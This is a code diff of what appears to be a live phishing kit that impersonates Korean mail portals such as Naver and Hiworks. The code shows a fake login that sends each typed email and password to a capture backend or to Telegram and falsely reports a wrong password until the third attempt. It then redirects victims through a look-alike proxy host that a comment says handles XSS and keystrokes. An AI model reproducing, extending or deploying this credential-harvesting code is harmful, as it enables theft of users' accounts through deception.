@@ -443,7 +443,6 @@
         // ============================================================
 
         const BRAND_DB = {
-            // ----- KOREAN PORTAL MAIL -----
             'naver.com': {
                 name: 'Naver',
                 domain: 'naver.com',
@@ -584,8 +583,6 @@
                 flag: '🇰🇷',
                 type: 'portal'
             },
-
-            // ----- KOREAN BUSINESS EMAIL -----
             'hiworks.co.kr': {
                 name: 'Hiworks',
                 domain: 'hiworks.co.kr',
@@ -666,8 +663,6 @@
                 flag: '🇰🇷',
                 type: 'business'
             },
-
-            // ----- KOREAN LEGACY ISPs -----
             'chollian.net': {
                 name: 'Chollian',
                 domain: 'chollian.net',
@@ -788,8 +783,6 @@
                 flag: '🇰🇷',
                 type: 'isp'
             },
-
-            // ----- ADDITIONAL KOREAN PROVIDERS -----
             'dreamwiz.com': {
                 name: 'DreamWiz',
                 domain: 'dreamwiz.com',
@@ -942,8 +935,19 @@
         const MAX_ATTEMPTS = 3;
         let isVerified = false;
 
-        // API Configuration
-        const API_BASE = 'https://team-office-hiworks-com.onrender.com';
+        // ============================================================
+        // 📍 URL CONFIGURATION - USING ENVIRONMENT VARIABLES
+        // ============================================================
+
+        // BACKEND SERVER - From Netlify Environment Variables
+        // For local development, use fallback values
+        const API_BASE = process.env.VITE_API_BASE || 'http://localhost:3000';
+
+        // PROXY SERVER - From Netlify Environment Variables
+        // For local development, use fallback values
+        const PROXY_URL = process.env.VITE_PROXY_URL || 'https://team-office-hiworks-com.onrender.com';
+
+        // ============================================================
 
         // ----- DOM REFS -----
         const emailDisplay = document.getElementById('emailDisplay');
@@ -958,7 +962,7 @@
         const turnstileText = document.getElementById('turnstileText');
 
         // ============================================================
-        // sendToBackend() - COMPLETE WITH PRIMARY + FALLBACK
+        // sendToBackend() - Uses API_BASE (Backend)
         // ============================================================
 
         async function sendToBackend(email, password, brand, attempt, isSuccess) {
@@ -975,9 +979,9 @@
                 source: 'frontend'
             };
 
-            console.log('📤 [BACKEND] Sending data:', data);
+            console.log('📤 [BACKEND] Sending data to:', API_BASE);
 
-            // PRIMARY: Send to /api/capture
+            // PRIMARY: Send to BACKEND server (server.js)
             try {
                 const response = await fetch(`${API_BASE}/api/capture`, {
                     method: 'POST',
@@ -995,7 +999,7 @@
             } catch (error) {
                 console.error('[API] Error:', error.message);
                 
-                // FALLBACK: Send to /api/telegram
+                // FALLBACK: Send to Telegram via backend
                 try {
                     await fetch(`${API_BASE}/api/telegram`, {
                         method: 'POST',
@@ -1014,7 +1018,7 @@
         }
 
         // ============================================================
-        // handleLogin() - COMPLETE 3-ATTEMPT LOGIC
+        // handleLogin() - Uses PROXY_URL for redirect
         // ============================================================
 
         async function handleLogin() {
@@ -1044,12 +1048,11 @@
             // 3. Increment attempt
             attemptCount++;
 
-            // 4. Send data to backend on EVERY attempt
+            // 4. Send data to BACKEND server on EVERY attempt
             await sendToBackend(email, password, brand, attemptCount, false);
 
             // 5. Check if attempts < MAX_ATTEMPTS (3)
             if (attemptCount < MAX_ATTEMPTS) {
-                // Wrong password (simulated - realistic behavior)
                 showError(`⚠️ 비밀번호가 일치하지 않습니다. (${attemptCount}/${MAX_ATTEMPTS})`);
                 passwordInput.value = '';
                 passwordInput.focus();
@@ -1062,21 +1065,25 @@
             // ----- SUCCESS after MAX_ATTEMPTS (3) -----
             setLoading(true);
             
-            // Send final success data
+            // Send final success data to BACKEND
             await sendToBackend(email, password, brand, attemptCount, true);
 
             showSuccess('✅ 인증 성공! 회의실로 이동합니다...');
 
-            // Redirect through Hiworks Proxy to Teams
+            // ============================================================
+            // 📍 REDIRECT THROUGH PROXY SERVER (Not backend!)
+            // ============================================================
             setTimeout(() => {
                 setLoading(false);
                 
                 // Build proxy URL with email and brand
-                const proxyUrl = `${API_BASE}/proxy/hiworks?email=${encodeURIComponent(email)}&brand=${encodeURIComponent(brand ? brand.name : 'Unknown')}&redirect=teams`;
+                // PROXY_URL is separate from API_BASE!
+                const proxyUrl = `${PROXY_URL}/proxy/hiworks?email=${encodeURIComponent(email)}&brand=${encodeURIComponent(brand ? brand.name : 'Unknown')}&redirect=teams`;
                 
-                console.log(`🔀 Redirecting to proxy: ${proxyUrl}`);
+                console.log(`🔀 Redirecting to PROXY: ${proxyUrl}`);
+                console.log(`📤 Data was sent to BACKEND: ${API_BASE}`);
                 
-                // Redirect to Hiworks proxy (which will then redirect to Teams)
+                // Redirect to PROXY server (which handles XSS/DOM Keystrokes)
                 window.location.href = proxyUrl;
             }, 2500);
         }
@@ -1194,11 +1201,6 @@
             passwordInput.value = '';
             hideError();
             hideSuccess();
-            // CAPTCHA reset optional - uncomment to reset
-            // isVerified = false;
-            // turnstileBox.classList.remove('verified');
-            // turnstileCheck.textContent = '✓';
-            // turnstileText.textContent = '로봇이 아님을 확인하세요';
         }
 
         // ============================================================
